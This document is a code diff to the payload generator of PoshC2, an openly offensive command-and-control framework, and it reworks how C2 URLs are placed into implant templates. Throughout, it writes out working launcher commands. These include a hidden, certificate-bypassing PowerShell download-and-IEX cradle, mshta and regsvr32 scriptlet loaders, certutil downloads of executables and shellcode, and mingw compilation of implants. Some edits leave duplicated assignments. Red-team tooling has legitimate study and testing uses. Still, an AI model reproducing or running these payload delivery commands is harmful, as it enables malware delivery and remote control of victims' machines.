@@ -1,10 +1,10 @@
 from io import StringIO
-import gzip, base64, subprocess, os, hashlib
+import gzip, base64, subprocess, os, hashlib, shutil
 
 from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, DatabaseType
 from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName
 from poshc2.Colours import Colours
-from poshc2.Utils import gen_key, randomuri, formStrMacro, formStr, offsetFinder
+from poshc2.Utils import gen_key, randomuri, formStrMacro, formStr, offsetFinder, get_first_url
 
 
 if DatabaseType.lower() == "postgres":
@@ -81,7 +81,8 @@ class Payloads(object):
 
         cs = str(content).replace("#REPLACEINSECURE#", self.Insecure)
         cs1 = cs.replace("#REPLACEHOSTPORT#", self.PayloadCommsHost)
-        cs2 = cs1.replace("#REPLACEIMPTYPE#", (self.PayloadCommsHost + self.ConnectURL + self.ImplantType))
+        cs11 = cs1.replace("#REPLACECONNECTURL#", (self.ConnectURL + self.ImplantType))
+        cs2 = cs11.replace("#REPLACEIMPTYPE#", self.PayloadCommsHost)
         cs3 = cs2.replace("#REPLACEKILLDATE#", self.KillDate)
         cs4 = cs3.replace("#REPLACEPROXYUSER#", self.Proxyuser)
         cs5 = cs4.replace("#REPLACEPROXYPASS#", self.Proxypass)
@@ -139,13 +140,22 @@ class Payloads(object):
         output_file.close()
         self.QuickstartLog("Batch Payload written to: %s" % filename)
 
+        if name == "":
+            self.QuickstartLog("Execution via PS Prompt" + Colours.GREEN)
+            firsturl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
+            psuri = f"{firsturl}/{self.QuickCommand}_rp"
+            pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('%s')));IEX $MS" % psuri
+            psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
+            self.QuickstartLog("powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc.decode('UTF-8'))
+            self.QuickstartLog(Colours.END)
+
     def CreateDroppers(self, name=""):
         # Create Sharp DLL
         with open("%sdropper.cs" % PayloadTemplatesDirectory, 'r') as f:
             content = f.read()
         cs = str(content).replace("#REPLACEKEY#", self.Key)
         cs1 = cs.replace("#REPLACEBASEURL#", self.PayloadCommsHost)
-        cs2 = cs1.replace("#REPLACESTARTURL#", (self.PayloadCommsHost + self.ConnectURL + "?c"))
+        cs2 = cs1.replace("#REPLACESTARTURL#", (self.ConnectURL + "?c"))
         cs3 = cs2.replace("#REPLACEKILLDATE#", self.KillDate)
         cs4 = cs3.replace("#REPLACEDF#", self.DomainFrontHeader)
         cs5 = cs4.replace("#REPLACEUSERAGENT#", self.UserAgent)
@@ -335,13 +345,14 @@ a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec b
         output_file.write(raw2)
         output_file.close()
 
+        firsturl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
         self.QuickstartLog(Colours.END)
+        firsturl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
         self.QuickstartLog("Execution via Command Prompt" + Colours.GREEN)
-
-        psuri = self.PayloadCommsHost + "/" + self.QuickCommand + "_rp"
+        psuri = f"{firsturl}/{self.QuickCommand}_rp"
         pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('%s')));IEX $MS" % psuri
         psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
-        uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_cs"
+        uri = f"{firsturl}/{self.QuickCommand}_cs"
 
         # only run if the domainfrontheader is null
         if self.DomainFrontHeader:
@@ -352,7 +363,7 @@ a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec b
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("Other Execution Methods" + Colours.GREEN)
         self.QuickstartLog("mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % uri)
-        uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_rg"
+        uri = f"{firsturl}/{self.QuickCommand}_rg"        
         self.QuickstartLog("regsvr32 /s /n /u /i:%s scrobj.dll" % uri)
         self.QuickstartLog("")
 
@@ -451,8 +462,8 @@ ao.run('%s', 0);window.close();
         cs2 = cs1.replace("#REPLACESPYTHONKEY#", self.PyDropperKey)
         cs3 = cs2.replace("#REPLACEKEY#", self.Key)
         cs4 = cs3.replace("#REPLACEHOSTPORT#", self.PayloadCommsHost)
-        cs5 = cs4.replace("#REPLACEQUICKCOMMAND#", self.PayloadCommsHost + "/" + self.QuickCommand + "_py")
-        cs6 = cs5.replace("#REPLACECONNECTURL#", (self.PayloadCommsHost + self.ConnectURL + "?m"))
+        cs5 = cs4.replace("#REPLACEQUICKCOMMAND#", ("/" + self.QuickCommand + "_py"))
+        cs6 = cs5.replace("#REPLACECONNECTURL#", (self.ConnectURL + "?m"))
         cs7 = cs6.replace("#REPLACEDOMAINFRONT#", self.DomainFrontHeader)
         cs7 = cs7.replace("#REPLACEURLID#", str(self.URLID))
         self.PyDropper = cs7.replace("#REPLACEUSERAGENT#", self.UserAgent)
@@ -523,7 +534,8 @@ ao.run('%s', 0);window.close();
         output_file.close()
 
         try:
-            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_ex64"
+            firsturl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
+            uri = f"{firsturl}/{self.QuickCommand}_ex86"
             filename = randomuri()
             self.QuickstartLog(Colours.END)
             self.QuickstartLog("Download Posh64 & Posh32 executables using certutil:" + Colours.GREEN)
@@ -536,7 +548,8 @@ ao.run('%s', 0);window.close();
                 compile32 = "i686-w64-mingw32-gcc -w %s%sPosh32.c -o %s%sPosh32.exe" % (self.BaseDirectory, name, self.BaseDirectory, name)
             subprocess.check_output(compile64, shell=True)
             subprocess.check_output(compile32, shell=True)
-            uri = self.PayloadCommsHost + "/" + self.QuickCommand + "_ex86"
+            uri = f"{firsturl}/{self.QuickCommand}_ex64"
+
             filename = randomuri()
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (uri, filename))
             if os.name == 'nt':
@@ -550,13 +563,18 @@ ao.run('%s', 0);window.close();
 
             self.QuickstartLog(Colours.END)
             self.QuickstartLog("Download Posh/Sharp x86 and x64 shellcode from the webserver:" + Colours.GREEN)
+            firsturl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
             uri = self.PayloadCommsHost + "/" + self.QuickCommand + "s/64/portal"
+            uri = f"{firsturl}/{self.QuickCommand}s/64/portal"
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
             uri = self.PayloadCommsHost + "/" + self.QuickCommand + "s/86/portal"
+            uri = f"{firsturl}/{self.QuickCommand}s/86/portal"
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
             uri = self.PayloadCommsHost + "/" + self.QuickCommand + "p/64/portal"
+            uri = f"{firsturl}/{self.QuickCommand}p/64/portal"
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
             uri = self.PayloadCommsHost + "/" + self.QuickCommand + "p/86/portal"
+            uri = f"{firsturl}/{self.QuickCommand}p/86/portal"
             self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.bin" % (uri, filename))
 
         except Exception as e:
